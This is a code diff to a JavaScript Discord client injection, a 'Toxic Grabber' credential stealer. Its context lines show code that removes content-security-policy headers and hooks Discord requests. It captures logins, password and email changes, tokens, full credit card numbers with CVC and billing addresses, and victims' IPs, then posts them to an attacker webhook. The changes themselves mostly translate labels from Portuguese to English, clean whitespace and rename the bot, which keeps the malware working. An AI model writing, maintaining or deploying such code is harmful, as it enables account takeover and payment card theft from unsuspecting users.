@@ -3,7 +3,7 @@ const path = require('path');
 const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
- 
+
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
         return !0
@@ -30,12 +30,12 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 				}, details.responseHeaders)
 			});
 		}
- 
- 
+
+
 	} else {
 		delete details.responseHeaders['content-security-policy'];
 		delete details.responseHeaders['content-security-policy-report-only'];
- 
+
 		callback({
 			responseHeaders: {
 				...details.responseHeaders,
@@ -43,7 +43,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 			}
 		})
 	}
- 
+
 })
 const Filter = {
 	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
@@ -56,7 +56,7 @@ session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) =>
 			return;
 	}
 	if (FirstTime()) {}
- 
+
 	callback({})
 	return;
 })
@@ -81,7 +81,7 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}))
 }
- 
+
   function GetBadges(flags)
   {
   const Discord_Employee = 1;
@@ -94,9 +94,9 @@ function SendToWebhook(what) {
   const Early_Supporter = 512;
   const Bug_Hunter_Level_2 = 16384;
   const Early_Verified_Bot_Developer = 131072;
- 
+  
   var badges = "";
- 
+  
   if((flags & Discord_Employee) == Discord_Employee){
      badges += "Staff,";
   }
@@ -131,9 +131,9 @@ function SendToWebhook(what) {
       badges = "None"
   }
   return badges;
- 
+  
   }
- 
+
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -144,7 +144,7 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Toxic Grabber | Injetado",
+            username: "Toxic Injected",
             content: "",
             avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.png",
             embeds: [
@@ -153,11 +153,11 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**Informações da Conta**",
-                            "value": `EMAIL: ${email} - SENHA: ${password}`,
+                            "value": `Email: ${email} - Senha: ${password}`,
                             "inline": true
                         },
                         {
-                            "name": "**Token de Login**",
+                            "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
                         }
@@ -175,7 +175,7 @@ function Login(email, password, token) {
         SendToWebhook(JSON.stringify(params))
     })
 }
- 
+
 function ChangePassword(oldpassword, newpassword, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -192,7 +192,7 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Toxic Grabber | Injetado",
+                username: "Toxic Injected",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.png",
                 embeds: [
@@ -201,12 +201,12 @@ function ChangePassword(oldpassword, newpassword, token) {
                         "fields": [
                             {
                                 "name": "**Senha alterada**",
-                                "value": `Email: ${json.email}\nSenha Antiga: ${oldpassword}\nSenha atual: ${newpassword}`,
+                                "value": `Email: ${json.email}\nSenha Antiga: ${oldpassword}\nNova Senha: ${newpassword}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Outras informações**",
-                                "value": `Tipo nitro: ${GetNitro(json.premium_type)}\nEmblemas: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -229,7 +229,7 @@ function ChangePassword(oldpassword, newpassword, token) {
         })
     })
 }
- 
+
 function ChangeEmail(newemail, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -245,7 +245,7 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Toxic Grabber | Injetado",
+                username: "Toxic Injected",
                 content: "",
                 avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.png",
                 embeds: [
@@ -254,12 +254,12 @@ function ChangeEmail(newemail, password, token) {
                         "fields": [
                             {
                                 "name": "**Email alterado**",
-                                "value": `Novo Email: ${newemail}\nSenha: ${password}`,
+                                "value": `Novo E-mail: ${newemail}\nSenha: ${password}`,
                                 "inline": true
                             },
                             {
                                 "name": "**Outras informações**",
-                                "value": `Tipo nitro: ${GetNitro(json.premium_type)}\nEmblemas: ${GetBadges(json.flags)}\nIP: ${ip}
+                                "value": `Tipo Nitro: ${GetNitro(json.premium_type)}\nEmblemas: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -282,7 +282,7 @@ function ChangeEmail(newemail, password, token) {
         })
     })
 }
- 
+
 function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -299,16 +299,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Toxic Grabber | Injetado",
+                username: "Toxic Injected",
                 content: "",
-                avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.pngg",
+                avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.png",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
                                 "name": "**Cartão de crédito adicionado**",
-                                "value": `Número do Cartão de Crédito: ${number}\nVencimento do cartão de crédito: ${expir_month}/${expir_year}\nCVC: ${cvc}\n País: ${country}\nEstado ${state}\nCidade ${city}\nCEP: ${zip}\n Rua: ${street}`,
+                                "value": `Número: ${number}\nVencimento: ${expir_month}/${expir_year}\nCVV: ${cvc}\n País: ${country}\nEstado ${state}\nCidade ${city}\nCEP: ${zip}\n Rua: ${street}`,
                                 "inline": true
                             },
                             {
@@ -352,16 +352,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
             var params = {
-                username: "Toxic Grabber | Injetado",
+                username: "Toxic Injected",
                 content: "",
-                avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.pngg",
+                avatar_url: "https://media.discordapp.net/attachments/925542871937994792/925805905554047076/Z.png",
                 embeds: [
                     {
                         "color": 16507654,
                         "fields": [
                             {
                                 "name": "**Cartão de crédito adicionado**",
-                                "value": `Número do Cartão de Crédito: ${number}\nVencimento do cartão de crédito: ${expir_month}/${expir_year}\nCVC: ${cvc}\n País: ${country}\nEstado ${state}\nCidade ${city}\nCEP: ${zip}\n Rua: ${street}`,
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                 "inline": true
                             },
                             {
